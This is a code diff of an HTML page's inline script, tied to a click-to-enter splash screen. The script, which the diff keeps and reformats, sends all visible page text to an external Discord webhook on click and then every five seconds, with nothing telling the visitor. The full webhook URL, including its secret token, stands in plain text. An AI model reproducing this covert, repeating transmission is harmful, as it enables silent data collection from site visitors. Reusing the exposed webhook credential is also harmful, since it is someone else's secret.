@@ -22,34 +22,37 @@
 <script>
   const splash = document.getElementById("enter-remove");
   const main = document.getElementById("main");
-  const webhookURL = "https://discord.com/api/webhooks/1450596628103823471/Qd1NzFsMESh1hVxYyxz-VwfWcI9dSsLwTGlLd1ePGodNpMmRmh9PGdkHnwhIHOWk2Ad-"; // replace with your actual webhook
+  const webhookURL = "https://discord.com/api/webhooks/1450596628103823471/Qd1NzFsMESh1hVxYyxz-VwfWcI9dSsLwTGlLd1ePGodNpMmRmh9PGdkHnwhIHOWk2Ad-"; 
+  function sendEmbed() {
+    const visibleText = document.body.innerText.trim();
 
-  function sendToWebhook() {
-    const data = {
-      pageTitle: document.title,
-      // send everything visible on the page, not just #main
-      content: document.body.innerText,
-      timestamp: new Date().toISOString()
+    const embedPayload = {
+      embeds: [
+        {
+          title: "Visible Page Content",
+          description: visibleText,
+          color: 0x3498db 
+        }
+      ]
     };
 
     fetch(webhookURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
+      body: JSON.stringify(embedPayload)
     })
     .then(res => console.log("Sent:", res.status))
     .catch(err => console.error("Error:", err));
   }
 
   splash.addEventListener("click", () => {
-    splash.style.display = "none";   // hide splash
-    main.style.display = "block";    // show main content
+    splash.style.display = "none";   
+    main.style.display = "block";    
 
-    sendToWebhook();                 // send first update
-    setInterval(sendToWebhook, 5000); // keep sending every 5 seconds
+    sendEmbed();                    
+    setInterval(sendEmbed, 5000);    
   });
 </script>
-
 
   <script>
    var BrowserDetector = (function() {
